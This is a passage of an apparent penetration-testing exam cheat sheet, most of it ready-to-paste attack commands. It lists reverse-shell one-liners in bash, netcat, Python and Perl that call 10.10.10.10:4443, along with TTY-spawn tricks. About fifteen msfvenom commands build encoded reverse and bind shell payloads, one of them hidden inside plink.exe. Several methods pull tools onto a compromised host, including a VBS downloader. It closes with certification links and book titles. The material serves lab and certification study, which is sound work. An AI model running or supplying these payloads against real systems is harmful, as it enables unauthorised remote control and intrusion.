- Metasploit payloads (msfvenom): https://netsec.ws/?p=331
- Best Web Shells: https://www.1337pwn.com/best-php-web-shells/
    - https://github.com/artyuum/Simple-PHP-Web-Shell
    - http://www.topshellv.com/
- Escape from SHELLcatraz: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=10

### Reverse Shells
````
- bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
- nc -e /bin/sh 10.10.10.10 4443
- nc -e cmd.exe 10.10.10.10 4443
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````

### Spawn TTY Shells
````
- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- (From within IRB): exec "/bin/sh"
- (From within vi): :!bash
- (From within vi): :set shell=/bin/bash:shell
- (From within nmap): !sh
````

### msfvenom payloads
````
- PHP reverse shell: msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
- Java WAR reverse shell: msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
- Linux bind shell: msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
- Linux FreeBSD reverse shell: msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
- Linux C reverse shell: msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
- Windows non staged reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
- Windows Staged (Meterpreter) reverse shell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
- Windows Python reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
- Windows ASP reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
- Windows ASPX reverse shell: msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
- Windows JavaScript reverse shell with nops: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
- Windows Powershell reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
- Windows reverse shell excluding bad characters: msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
- Windows x64 bit reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
- Windows reverse shell embedded into plink: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
````

## File Transfers

```
HTTP
# In Kali
python -m SimpleHTTPServer 80
# In reverse shell - Linux
wget 10.10.10.10/file
# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

```
FTP
# In Kali
python -m pyftpdlib -p 21 -w
# In reverse shell
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt
# Execute
ftp -v -n -s:ftp.txt
“Name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.”
```

```
TFTP
# In Kali
atftpd --daemon --port 69 /tftp
# In reverse shell
tftp -i 10.10.10.10 GET nc.exe
```

```
VBS
If FTP/TFTP fails you, this wget script in VBS is the go to on Windows machines.
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
# Execute
cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

## Offensive Security Links

- OSCP Certification Exam Guide: https://support.offensive-security.com/oscp-exam-guide/
- Proctored Exam Guide: https://www.offensive-security.com/faq/#proc-1
    - https://support.offensive-security.com/proctoring-faq/
- OSCP Exam FAQ: https://forums.offensive-security.com/showthread.php?2191-FAQ-Questions-about-the-OSCP-Exam
- Common Technical Issues: https://forums.offensive-security.com/showthread.php?2190-Common-Technical-Issues
- General Questions: https://forums.offensive-security.com/showthread.php?2189-General-questions-about-the-PWK-course
- Network Introduction Guide: https://support.offensive-security.com/pwk-network-intro-guide/

## Books

- [RTFM - Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_1?keywords=RTFM+-+Red+Team+Field+Manual&qid=1573218400&sr=8-1)
- [Penetration Testing - A Hands-On Introduction to Hacking](https://www.amazon.com/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641/ref=sr_1_1?keywords=Penetration+Testing+-+A+Hands-On+Introduction+to+Hacking&qid=1573218418&sr=8-1)
- [Metasploit The Penetration Tester’s Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X/ref=sr_1_1?keywords=Metasploit+The+Penetration+Tester%E2%80%99s+Guide&qid=1573218431&sr=8-1)
- [Web Application Hacker's Handbook](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?keywords=Web+Application+Hacker%27s+Handbook&qid=1573218445&sr=8-1)
